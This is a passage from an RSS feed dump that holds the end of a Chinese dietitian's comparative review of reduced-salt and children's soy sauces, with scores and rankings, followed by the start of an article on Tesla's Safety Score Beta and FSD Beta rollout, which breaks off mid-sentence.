data-rawwidth=\"553\" data-rawheight=\"415\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-a96090cf42290213d66fce673edf9b29\" data-watermark-src=\"v2-a9ea765031b9f920ad91b31db063bbae\" data-private-watermark-src=\"v2-76b335577d11973f3ca0313b505079f8\"></p>\n<h2>二、评测维度</h2>\n<p>这次减盐酱油的评测内容主要涉及以下几个方面：</p>\n<h3>1、钠含量</h3>\n<p>钠含量是判断有没有减盐、减了多少盐的重要依据。通常普通酱油的钠含量在1000~1200mg/15ml左右，这个数据可以在产品的营养成分表里看到。 </p>\n<p>但是需要注意的是有的产品标示的是每15ml的钠含量，有的则是10ml、8ml等其他规格。因此要比较钠含量，那就必须统一规格。 </p>\n<p>这次评测的减盐酱油里，减盐的程度差异明显。我们以普通酱油1200mg/15ml的标准把32款酱油分了几个类别。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-85e408801b3d3bd4c97b082b0c07b21e_720w.jpg?rss\" data-rawwidth=\"553\" data-rawheight=\"505\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-85e408801b3d3bd4c97b082b0c07b21e\" data-watermark-src=\"v2-30a6613bff3a41551a1f9c2a7144a475\" data-private-watermark-src=\"v2-fb847ff93eb5c76ff4f1e0af282b923d\"></p>\n<p>至于4款调味汁产品，三井宝宝的2款产品钠含量在500mg左右。而雀巢美极减盐鲜味汁950mg，Bragg调味汁960mg本质上也是减了个寂寞。 </p>\n<p><b><i>根据《预包装食品营养标签通则》，钠含量是允许有误差的，≤120%的标示值都是允许的。所以每15ml的酱油里相差几十mg钠可能意义并不大。</i></b></p>\n<p><br></p>\n<h3>2、氨基酸态氮含量</h3>\n<p>酱油最主要的目的就是提供鲜味，所以酱油里氨基酸态氮含量是评判品质好坏的关键指标。如果在减盐的基础上，依然能保证高氨基酸态氮含量，那才是有意义的「减盐酱油」。否则减盐的同时也减鲜，吃起来不给力反而要加的更多，减盐的意义也就不在了。 </p>\n<p>根据国标，氨基酸态氮含量≥0.8g的为特级酱油，≥0.7g是一级酱油，≥0.55g是二级酱油，≥0.4g是三级酱油。 </p>\n<p>在28款产品中，只有3款产品没有达到国标特级标准，分别是厨邦小淘气（0.55）、李锦记薄盐生抽（0.55）和李锦记薄盐醇味鲜（0.7）</p>\n<p><img src=\"https://pic4.zhimg.com/v2-4f4662310cac29af154bbfde80cdc0f2_720w.jpg?rss\" data-rawwidth=\"553\" data-rawheight=\"415\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-4f4662310cac29af154bbfde80cdc0f2\" data-watermark-src=\"v2-48b52e5e5162a2e0bc83e7b24917b85a\" data-private-watermark-src=\"v2-87af27cc5d0bca770bfe9d2ddc391e9d\"></p>\n<p><b>令人惊喜的是，有22款产品的氨基酸态氮含量高于国标特级标准，分别是：</b></p>\n<p>禾泱泱昆布款（1.3）、禾泱泱黑豆款（1.2）、味事达薄盐味极鲜（1.2）、东古淡盐一品鲜（1.2）、信芳园古方原酿（1.1）、欣和六月鲜轻8g（1）、欣和六月鲜轻10g（1）、玉兔秋田满满（1）、爷爷的农场（1）、小鹿蓝蓝（1）、海天拌饭酱油（1）、海天淡盐头道（1）、玉兔应物喜饭（1）、珠江桥牌轻盐（1）、李锦记味极鲜薄盐（1）、佳佳减盐生抽（1）、海天裸酱油（1）、加加小加酱油（1）、欣和六月鲜轻12g牡蛎（0.9）、欣和六月鲜轻12g昆布（0.9）、欣和禾然有机亲宝（0.9）、欣和禾然有机乐童（0.9）。</p>\n<p><b>但是好的减盐酱油，光看氨基酸态氮可不行。厂家为了提高氨基酸态氮含量，可以做的小动作太多了......所以一定要结合配料表才行！（我们后面就来细说啦！）</b></p>\n<h3>3、配料表</h3>\n<p><b>酿造酱油的基础配料是：水、盐、大豆和或小麦，除此以外的配料都是非必需的</b>。在这次评测的产品中，有10款产品只有基础配料，非常纯粹。分别是：</p>\n<p><img src=\"https://pic4.zhimg.com/v2-8e18239bdab28a67d052b00aae5f04dc_720w.jpg?rss\" data-rawwidth=\"553\" data-rawheight=\"369\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-8e18239bdab28a67d052b00aae5f04dc\" data-watermark-src=\"v2-42fcdd96412ce31d11f76bf020a71a32\" data-private-watermark-src=\"v2-7df404f9c4a9c55fe456905a00d8b917\"></p>\n<p><b><i>欣和六月鲜轻8g；欣和六月鲜轻10g；信芳园古方原酿；小鹿蓝蓝（玉兔代工）；</i></b></p>\n<p><b><i>玉兔秋田满满；玉兔应物喜饭；爷爷的农场（食圣代工）；欣和禾然乐童；欣和禾然亲宝；禾泱泱黑豆款。</i></b> </p>\n<p>除了上述10款产品只含有基础配料外，剩下18款产品都添加了其它成分，具体的目的和作用如下：大致是增鲜（增味剂）、调味（甜味剂、酸度调节剂）、防腐（防腐剂）、上色（着色剂）等。总之，这些都不是必需的。</p>\n<h3>4、主观口感</h3>\n<p>减盐酱油好不好吃、和普通酱油的口感区别在哪里、吃起来是不是觉得淡？这些主观口感我和钱爸也做了体验。但由于口感是主观感受，并且不同场景下的感觉是不同的，比如凉拌、烹饪、佐餐时带来的感觉是不同的，大家参考就好。这一部分就不放在文字里了，感兴趣的小伙伴可以去视频里看看。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-98657251c19f17e1df7be2420eef0b65_720w.jpg?rss\" data-rawwidth=\"553\" data-rawheight=\"415\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-98657251c19f17e1df7be2420eef0b65\" data-watermark-src=\"v2-32f597237e47044e801cea6595547182\" data-private-watermark-src=\"v2-28863b92d2188696aefd001ef62c451d\"></p>\n<h3>5、容量选择</h3>\n<p>很多长辈在选购酱油时，也许会在意「减盐」两字，但真的在烧菜时却又嫌太淡反而会加的过多。这种习惯，会让他们觉得大容量包装的才经用，其实反而违背了购买「减盐酱油」的意义。</p>\n<p>所以我认为「减盐酱油」不应该盲目追求大容量，够用就好。 </p>\n<p>大容量规格还有一个最大的弊端，就是长时间的存放容易导致酱油变质。变质并非一定是酱油坏了不能吃了，而是过了酱油的最佳赏味期限。从这两点来看，容量上的选择应该遵循家庭酱油的用量来决定，通常1个月左右用完最佳，并且拆封后建议冷藏保存。这次评测的28款酱油容量均没有超过500ml，值得表扬。但有个别产品是有量贩装的，在选购时记得辨别。</p>\n<p><br></p>\n<h3>6、价格/性价比</h3>\n<p>酱油作为日用调味料，价格也是很多人考虑的因素。这次评测的酱油价格从几元到上百元不等，如果在减盐保鲜的同时，也能兼顾性价比，那自然能受到更多人的欢迎。 </p>\n<p>这次28款产品里，单价（每100ml的价格）区间为1.8元~86元，可谓天差地别。最贵的禾泱泱和最便宜的李锦记薄盐生抽，单价差了近50倍… </p>\n<p>不同人群对价格的敏感程度也不同，所以只看价格并没有太多的参考意义，需要结合上述其它维度综合判断。</p>\n<h2>三、评分环节</h2>\n<p>这部分的打分是我们根据自己的经验和一定的标准设置的，但仍具有一定的主观性，目的在于让大家可以通过数据更直观的去了解一款减盐酱油的综合实力。但是这毕竟不是科学严谨的实验和论文，仅供参考。 </p>\n<p>由于定位儿童酱油的产品，几乎清一色的采用了有机原料，价格上也是全面碾压普通减盐酱油。因此在评分环节，我还是将儿童酱油单独列出来。 </p>\n<h3><b>评分规则：</b></h3>\n<p><b>钠含量得分（满分10分，钠含量越低分值越高）</b></p>\n<p>第一梯队的产品得10分；</p>\n<p>第二梯队得8分；</p>\n<p>第三梯队得6分；</p>\n<p>第四梯队得4分；</p>\n<p>第五梯队得2分。</p>\n<h3><b>氨基酸态氮得分（满分10分，氨基酸态氮越高分值越高）</b></h3>\n<p>国标特级10分；</p>\n<p>国标1级8分；</p>\n<p>国标2级6分。</p>\n<h3><b>配料表得分（满分10分）</b></h3>\n<p>只有基础配料的10分；</p>\n<p>每增加<b>一类</b>非必需配料的-1分；</p>\n<p><b><i>同一类的成分达到的目的大致是相同的，比如白砂糖和葡萄糖就属于添加糖一类物质；酵母抽提物和谷氨酸钠就属于增鲜的一类物质。</i></b></p>\n<h3><b>特殊加分项：</b></h3>\n<p>氨基酸态氮高于国标特级（0.8）的产品每高0.1加1分。最后得到了如下表单：</p>\n<p><img src=\"https://pic2.zhimg.com/v2-d5b4a26b5d34ac2060219e5ec4c20983_720w.jpg?rss\" data-rawwidth=\"553\" data-rawheight=\"365\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-d5b4a26b5d34ac2060219e5ec4c20983\" data-watermark-src=\"v2-d424f3971e3aac5e865fca3919f627c0\" data-private-watermark-src=\"v2-abaf449a55857dbd9daa3429f7b0bfc9\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-34288daa58f5391c380879774b15651d_720w.jpg?rss\" data-rawwidth=\"553\" data-rawheight=\"213\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-34288daa58f5391c380879774b15651d\" data-watermark-src=\"v2-7ae63d818fe6c90e81a8edf3c033a529\" data-private-watermark-src=\"v2-960152379cc11e193af3a6d47e748244\"></p>\n<h2>四、结论及推荐款</h2>\n<h3>减盐酱油榜单：</h3>\n<p>1、欣和六月鲜轻系列8g（32分）</p>\n<p>2、欣和六月鲜轻系列10g（32分）</p>\n<p>3、玉兔信芳园古方原酿（31分）</p>\n<p><img src=\"https://pic3.zhimg.com/v2-183a45800c93922cb49620484eaf01da_720w.jpg?rss\" data-rawwidth=\"553\" data-rawheight=\"311\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-183a45800c93922cb49620484eaf01da\" data-watermark-src=\"v2-14bdf00b819a2ace197952ee00408fec\" data-private-watermark-src=\"v2-0c00c703b942ce34b696bce46c291ee5\"></p>\n<p>定位减盐酱油的产品中，欣和六月鲜的轻系列8g和10g两款产品无论从钠、氨基酸态氮还是配料表方面都无可挑剔。玉兔信芳园古方原酿虽然钠含量略不如前两者，但氨基酸态氮含量也略高。这3款产品是值得推荐的减盐酱油。 </p>\n<p>口感方面，玉兔该款产品比轻系列的两款更为浓郁，个人感觉有些过头，不太适合凉拌，更适合加热烹饪时使用。</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429974209955598336\"></a><p><br></p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429974347435515905\"></a><p><br></p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429974635366903808\"></a><h3>儿童酱油榜单：</h3>\n<p>1、禾泱泱昆布款（34分）</p>\n<p>2、秋田满满、小鹿蓝蓝、爷爷的农场（30分）</p>\n<p><img src=\"https://pic4.zhimg.com/v2-6ae9e0763970759ae3a6e29cecab4cd6_720w.jpg?rss\" data-rawwidth=\"553\" data-rawheight=\"311\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-6ae9e0763970759ae3a6e29cecab4cd6\" data-watermark-src=\"v2-58284cb80587a493dad8dfc161c13c03\" data-private-watermark-src=\"v2-bc96ad0639a9dbb9ddf13e0089d86a52\"></p>\n<p>别急下单！虽然禾泱泱昆布款得分第一，但我却不太推荐。 </p>\n<p>定位儿童酱油的产品里，除了海天的儿童拌饭酱油配料表不太推荐以外（添加剂很多），其余产品的配料表都非常不错，在这方面体现出了「儿童酱油」应有的水准。 </p>\n<p>禾泱泱昆布款的氨基酸态氮含量非常高，所以综合的得分是最高的。但这款也是除了海天儿童拌饭酱油外，唯一一款加了糖。 </p>\n<p>但不得不客观地说，酿造时间在1年以上的酱油，几乎全都加了糖。比如我之前被朋友安利的耗时5年酿造的「老恒和太油」，在没有添加增鲜成分的前提下，氨基酸态氮含量高达1.5，配料里同样也加了糖，这可能与酿造工艺以及口感方面的调和有关。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-ba81bac1e622237fa4828790c3286961_720w.jpg?rss\" data-rawwidth=\"437\" data-rawheight=\"347\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-ba81bac1e622237fa4828790c3286961\" data-watermark-src=\"v2-2ee4626f35962778122c6c07fedca2a6\" data-private-watermark-src=\"v2-c0c80b8bbcb04df79cdf87693c1a89e2\"></p>\n<p>禾泱泱昆布款的得分虽然第一，但禾泱泱黑豆款却拉胯了。虽然氨基酸态氮含量同样也很高（1.2），但是高达941mg的钠，不知道减盐减在了哪里。 </p>\n<p>不过别看昆布款得分不低，但最致命的问题是价格。比同类产品贵了3~5倍的售价，已经让绝大多数家长望而却步了。这个价格差是非常明显的，考虑性价比因素的话，禾泱泱产品的优势荡然无存，排在后面的一堆产品反而会是更亲民的选择。 </p>\n<p><b>然后我们看下第二名的几款「儿童酱油」。</b> </p>\n<p>秋田满满、小鹿蓝蓝两款均是玉兔代工生产的；爷爷的农场则是食圣生产。玉兔和食圣这两家山东淄博和山东烟台的厂家，给很多互联网新兴品牌做代工生产，也就是贴个牌子而已。另外，妈妈圈里热门的<u>麦乐诗、蛮小乖、宝宝馋了</u>等都是出自这两家。这其实意味着这些新兴的儿童酱油品牌，质量是几乎一样的，看准哪个促销买就行了。 </p>\n<p>欣和禾然的两款放在所有的减盐酱油里，29分的得分还是挺高的，和专做儿童市场的新兴品牌也并没有显著的差距。但是和自家的六月鲜轻系列8g、10g对比，除了有机卖点，似乎找不到花更多的钱的理由了。</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429974833199702016\"></a><p><br></p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429975018641612800\"></a><p><br></p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429975183280611328\"></a><p><br></p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429975288914952192\"></a><h3>性价比减盐榜单：</h3>\n<p>这是一份额外的榜单。主要适合对价格较为敏感的消费者，同时既要考虑减盐也保证鲜度，同时配料表里的额外成分尽可能偏少。 </p>\n<p><b>李锦记薄盐头道</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-09f5f09575019c917d4970c6e762d990_720w.jpg?rss\" data-rawwidth=\"553\" data-rawheight=\"311\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-09f5f09575019c917d4970c6e762d990\" data-watermark-src=\"v2-3f5cdf0085bd5d63fa0a6de4927e9091\" data-private-watermark-src=\"v2-05d062ac394a7a9bc81b0997cbca4206\"></p>\n<p>这也是唯一一款既用到了大豆也用到了脱脂大豆的产品，可以认为是为了控制成本。钠含量647mg/15ml，头道，2.4元/100ml，3种非必需配料，这些综合一起后是唯一一款值得推荐的性价比减盐产品。</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429975475477594112\"></a><h2>写在最后（非常重要）</h2>\n<p>最后还是想说说关于「减盐酱油」和所谓的「儿童酱油」的看法。</p>\n<h3><b>01【关于减盐酱油】</b></h3>\n<p>首先，作为营养师，我认为<b>「减盐酱油」</b>的存在的确是有意义的。要知道减盐50%的酱油相比普通酱油，意味着你可以每天多用30ml。这对于大多数无法掌控酱油添加量的人来说，在减少钠摄入方面无疑是极大的福音和切实可行的办法。 </p>\n<p>但有个很现实的问题是，目前没有规范的针对「减盐」的定义，这意味着减盐只是商家的宣传内容而已。各家推出的减盐产品其实都只是跟自家的普通酱油作对比。这里就会出现一个问题，减盐40%的A酱油，可能比减盐25%的B酱油，钠含量反而高。因为参照的对比物不一样。所以买减盐酱油的时候，可别只顾着「减盐XX%」，还是看看营养成分表里的钠含量靠谱呀~</p>\n<p>这次横评其实也发现了减盐酱油能做到减盐的同时保证鲜度，并且有多款产品可以在不添加任何增鲜成分的前提下，达到国标特级甚至更高的氨基酸态氮含量。所以，我们可以说好的酱油也是存在的。其实酱油本身用的就不应该多，花多一点的钱，买点好的减盐酱油给家里的掌勺人、爸妈、孩子，这也是健康饮食、减盐减钠的具体表现。</p>\n<h3><b>02【关于儿童酱油】</b></h3>\n<p>说到<b>「儿童酱油」</b>，虽然在同类产品里我做了得分榜单，但是和普通减盐酱油相比，儿童酱油除了包装更儿童化，酱油本身并没有本质的不同，价格却因为有机以及儿童卖点随之翻倍。 </p>\n<p>我一直提倡1岁后的孩子应尽早融入清淡的家庭饮食，这里面也包括了调味品的通用，所以我不认为儿童酱油是个必需品。 </p>\n<p>另外，大多互联网新兴儿童酱油品牌都出自山东的两家调味料的企业：山东淄博的玉兔和山东烟台的食圣。这两家给很多互联网新兴品牌做代工生产，也就是贴个牌子而已。至于其他一些在妈妈群里很火的品牌，比如「麦乐诗」也是食圣生产的。 </p>\n<p>此外，「蛮小乖」则是玉兔生产的。总的来说，目前国家是真的没有「儿童酱油」的标准，不要被包装、宣传所迷惑。如果真的是打算给孩子用的，还是要看看到底钠少了多少。</p>\n<p>别看酱油是个小物件，但酿造酱油的技术根本不可能速成。一下子冒出来那么多新兴品牌其实也能明白都是代工贴牌的产品了。 </p>\n<h3><b>03【关于酱油的口感和参数】</b></h3>\n<p>有的酱油参数上钠含量很低，但口感却很咸，咸的发苦。有的酱油虽然加了糖，从配料上似乎不那么纯粹，但口感却非常舒服。所以我觉得酱油作为调味品，还是要选择自己喜欢的，当然如果前提是希望达到减盐的目的，那就在钠含量低的产品里去选择适合自己口味的。 </p>\n<p>对于小朋友来说也是一样的，没有必要为了「绝对的低钠」和「绝对的配料表纯粹」去挑选产品，小朋友同样要选择他们喜欢的，控制总的使用量更重要。 </p>\n<p>比如我一开始在搜集产品数据的时候，我对三井宝宝的两款调味汁有点嗤之以鼻，觉得这不就是在酱油的基础上加了一些东西稀释后得到的嘛！但实际的口感却让我非常惊讶，这种口味是真的挺讨巧的，尤其是在给孩子佐餐的时候。并且钠含量也只有500mg左右，我个人是觉得这也是一个意外的收获。 </p>\n<h3><b>04【酱油中的酒精】</b></h3>\n<p>如果还有什么想说的，那就谈谈酱油里的「酒精」吧。这次的所有产品里，其实只有万字在配料表里额外添加了酒精。但其实几乎所有的酿造酱油都含有酒精，并且可能含量还不低，可以达到2~3%。这是因为酱油在酿造过程中需要酵母菌参与，在长时间的酿造中大豆和小麦会逐渐产生酒精。 </p>\n<p>从这点上来说，酱油不要给1岁内的孩子使用，1岁后的孩子也尽量要少用，尤其是凉拌、佐餐时，酱油并不是必备的。少用酱油本身也是减少钠摄入来源的一种有效措施，也有利于孩子培养清淡口味。 </p>\n<p><b>好啦，如果你喜欢这篇文章，请记得给我下反馈哟，也可以在留言区告诉我你的感受。</b></p>\n<blockquote>\n<b>我是</b> <a class=\"member_mention\" href=\"http://www.zhihu.com/people/e5f68460cb8972abe04d646756a137c6\" data-hash=\"e5f68460cb8972abe04d646756a137c6\" data-hovercard=\"p$b$e5f68460cb8972abe04d646756a137c6\">@菜妈和钱爸</a><b>，母婴盐究员，儿童教育优秀回答者，复旦大学营养学硕士，中国注册营养师，两个孩子的妈妈。</b>\n</blockquote>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/mammycai?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">菜妈和钱爸</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/26044502/answer/2159519266?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">109 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/402892361?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">0添加酱油真有那么好？好酱油怎么选？</a><br><a href=\"http://www.zhihu.com/question/308123646?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">为什么味极鲜比酱油好吃？</a><br>\n","link":"http://www.zhihu.com/question/26044502/answer/2159519266?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"靠「安全评分」进军汽车保险？特斯拉要反过来教司机开车","date":"2021-10-08 03:30:03","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>9 月 25 日，特斯拉在美国本土同时推送 Tesla OS v2021.32.22 和特斯拉 App v4.1 版本更新，<strong>更新了「FSD 完全自动驾驶 Beta 版申请按钮」和「安全评分 Beta 版」两个功能。</strong>基于这两个功能，特斯拉在数据驱动业务的维度向前跨越了一大步。 </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/0b08760a6dbe9bb6ea1d8e60f2bf08c1\" alt=\"图片\"></figure><p><br>简单来说，美国地区选装了 FSD 的特斯拉车主可以在系统更新至 2020.32.22 后点击「申请完全自动驾驶能力 Beta 版」，系统内置的「特斯拉保险计算器」会运行「安全评分 Beta 版」，<strong>待系统连续 7 天认定驾驶员驾驶习惯安全可靠后，该车即可收到 FSD Beta 的推送更新。 </strong></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/d632250b914cdfeb6b0dc2facb4a56f7\" alt=\"图片\"></figure><p><br>从 FSD 的全栈算法、公测用户的运营扩张乃至衍生的特斯拉 UBI（Usage-based insurance）车险，这一整个闭环的业务，<strong>特斯拉全部转向了基于数据驱动的机器学习。由此，特斯拉开启了全面升维的竞争。 </strong></p>\n<h2>安全评分 Beta 版</h2>\n<p>之所以将「安全评分 Beta 版」放在开头介绍，是因为无论是「FSD 完全自动驾驶 Beta 版申请按钮」还是「特斯拉保险」，都是以「安全评分」为根基的业务。那么，什么是「安全评分」？ </p>\n<p>据特斯拉的介绍：</p>\n<blockquote>\n<p>「安全评分」根据 5 个与安全相关的指标对特斯拉车主的驾驶行为进行评估，特斯拉将基于这些数据预测当事车主的驾驶习惯在未来驾驶车辆发生碰撞的可能性。</p>\n<p>「安全评分」的目的是为驾驶员提供透明度和对其驾驶行为的反馈。「安全评分」介于 0 和100 之间，分数越高表明驾驶越安全，<strong>特斯拉认为绝大多数司机的评分应当 ≥ 80 分。</strong></p>\n</blockquote>\n<p>那 5 个「安全相关的指标」分别是什么呢？驾驶员对车辆的操作控制无外乎横向和纵向控制两大维度，其中横向控制主要通过往左右打方向盘来实现，纵向控制通过加速和制动踏板实现。特斯拉「安全评分」的 5 个指标也逃不出这三大执行操作：</p>\n<p><strong>每千英里前方碰撞预警触发率</strong>（下记为 A），一个冗长但并不难理解的名词，每驾驶 1000 英里，驾驶员未介入而特斯拉 Autopilot 系统认为可能发生碰撞，从而触发「前方碰撞预警」的次数。 </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/a144fc5e0750d5e02661767de2c343de\" alt=\"图片\"></figure><p><br><strong>急刹车</strong>（下记为 B） ，一个比值。特斯拉的定义是在驾驶行程中，刹车减速度超过 0.3 g（相当每过一秒钟车速下降超过 6.7 mph 即 10.78 km/h），除以刹车减速度超过 0.1 g（相当于每过一秒钟车速下降超过 2.2 mph 即 3.54 km/h）的比值。 </p>\n<p><strong>猛转向</strong>（下记为 C），同样是一个比值。特斯拉的定义是在驾驶行程中，车辆左/右加速度超过 0.4 g（相当于每过一秒钟车辆向左/右的速度增加超过 8.9 mph 即 14.32 km/h），除以车辆左/右加速度超过 0.2 g（相当于每过一秒钟车辆向左/右的速度增加超过 4.5 mph 即 7.24km/h）的比值。 </p>\n<p><strong>不安全跟车</strong>（下记为 D），D 是一个动态值。Autopilot 根据本车速度、前车速度和两车间的距离判断。计算方法为当前车突然刹停，驾驶员做出反应并刹停所需的时间长度。D 的定义为反应时间低于 1 秒除以反应时间低于 3 秒的比值。此外，D 只有车速在 50 mph（80.47 km/h）才会被记录。 </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/c5aae552c5c812c73aa44de92a170f2f\" alt=\"图片\"></figure><p><strong>强制退出 Autopilot</strong>（下记为 E），特斯拉车主都知道，Autopilot 会在连续警告三次均得不到驾驶员的响应后退出，当驾驶员双手脱离方向盘或分心驾驶后，系统将发出警告。E 的定义是 5 个指标中最为简单的一个：如果驾驶行程中 Autopilot 出现强制退出，记为 1，否则记 0。 特斯拉有一个 PCF（Predicted Collision Frequency，预测碰撞频率）计算公式，将上述 A、B、C、D、E 五个数值计入如下公式，即可得出 PCF 值。 </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/6c433eafcd330789b7dadf6b367d4c87\" alt=\"图片\"></figure><blockquote><p><br>安全评分 = 115.382324 - 22.526504 × PCF </p></blockquote>\n<p>你一定想问，这 8 个精确到小数点后 6 位的数都是怎么来的。特斯拉表示，<strong>当前公式都是基于 60 亿英里车队数据的统计模型得出的。</strong> </p>\n<p>到这里，其实你已经能看出，这个「安全评分」并不简单。基于已有的 60 亿英里车队数据，准确地分辨出哪些车主的驾驶习惯良好，听上去就不是个轻松的事情，事实上，从首批车主的体验反馈看，连特斯拉也低估了 Ta 的难度。 </p>\n<h2>FSD 内测规模如何有序扩张</h2>\n<p>自 2020 年 10 月 21 日特斯拉首次公测 FSD Beta 至今，围绕特斯拉 FSD 一个相当广泛的质疑是，<strong>FSD Beta 公测的车队规模一直保持在 2000 辆上下。</strong>没有进入美国更多的州，也没运行在更多的 FSD 车型上。 </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/7a73873e93befc0d40184f897076b672\" alt=\"图片\"></figure><p>这和大众对特斯拉 FSD 的预期相去甚远，世界不需要另一个可扩展性严重受限的自动驾驶系统。过去 5 年来，Waymo、Cruise 们都没能带给我们惊喜，<strong>而特斯拉几乎是唯一一家直到 2021 年仍然「逢自动驾驶必谈 Scalability」的主流自动驾驶玩家。</strong></p>\n<p>但在质疑背后，特斯拉一直在以近乎疯狂的效率迭代着 FSD Beta 的全栈算法，不夸张地说，<strong>从 2020 年 10 月至今，超 20 个大小版本迭代后的 FSD Beta 10.1 已经发生了脱胎换骨的变化。</strong>这一点从 8 月 19 日的特斯拉 AI Day 大会亦可看出端倪。 </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/7d3e7651383db74abcf3e50fb29fe511\" alt=\"图片\"></figure><p><br>今天，FSD Beta 进阶到了一个尴尬的境地：一方面，特斯拉需要更多、更丰富的场景，以加快加速算法的迭代，这意味着更大规模的公测车队；另一方面，FSD Beta 虽然已经取得了巨大的改进，<strong>但 Ta 还不够好，至少不足以放心地让特斯拉将之推送到每一辆 FSD 车上。</strong></p>\n<p>在这片技术的无人区中，包括美国在内的全球各地监管机构，对自动驾驶技术多是抱以支持和鼓励发展的宽松监管态度，却并没有就自动驾驶系统如何有序、安全、可控地扩展到每一辆车上给出详细的管理办法。 </p>\n<p>这是技术跑在监管前的窘境，首批 2000 名公测车主易选（实际上也不是那么容易），20000 名呢？200000 名呢？<strong>今天，特斯拉在全球的保有量已经超过了 2000000 辆。这是一个非常棘手的问题。</strong> 于是特斯拉基于 60 亿英里的车队数据得出的统计模型做出了安全评分 Beta。 </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/cacbc8a153bfcbc5c7117bcd335c8de7\" alt=\"图片\"></figure><p>然后特斯拉的 Autopilot、座舱和 App 团队协作，面向美国的 FSD 车主同时推送 Tesla OS v2021.32.22 和特斯拉 App v4.1 版本更新。不过，和特斯拉的第一版智能召唤 Beta、第一版自动辅助导航驾驶（NoA）Beta 甚至第一版 FSD Beta 一样，<strong>第一版的安全评分体验之差，开发之 Beta 超出了不少车主的预期。</strong></p>\n<p>例如，知名特斯拉博主 @TeslaJoy 和 @Scott Wainner 都表示，驾驶员并没有违反上述 5 个指标，仅仅是基于 Autopilot 或 NoA 驾驶了一段行程，就会被「安全评分」判定为存在「急刹车」、「猛转向」或「不安全跟车」行为，将分数扣掉。两位博主暴露的问题在于，<strong>由于版本过于 Beta，特斯拉开发的自动驾驶算法甚至不能通过特斯拉「安全评分」的考验。</strong></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/80e84f4fea9085830510b156389d4456\" alt=\"图片\"></figure><p>由于安全评分的标准过于苛刻，大量车主选择谨慎驾驶以避免被扣分。外媒 Electrek 甚至给出了这样的标题：到处都是慢吞吞的特斯拉（Slow Teslas everywhere）。 </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/73b928e8db6d7bdeedf90cf0cfe9ac78\" alt=\"图片\"></figure><p>知名赛道爱好者、<strong>Model S Plaid 车主 Dragtimes 在零接管的情况下被打出了 5 分的低分。</strong></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/e130f1a90ae2a6ce60835eee86de9858\" alt=\"图片\"></figure><p>另一位特斯拉车主、通用旗下自动驾驶公司 Cruise 产品副总裁 Oliver Cameron 表示，<strong>如果一个致力于实现从 A 到 B 的自动驾驶产品，运行时给你的压力要比你自己开车压力还大，那 Ta 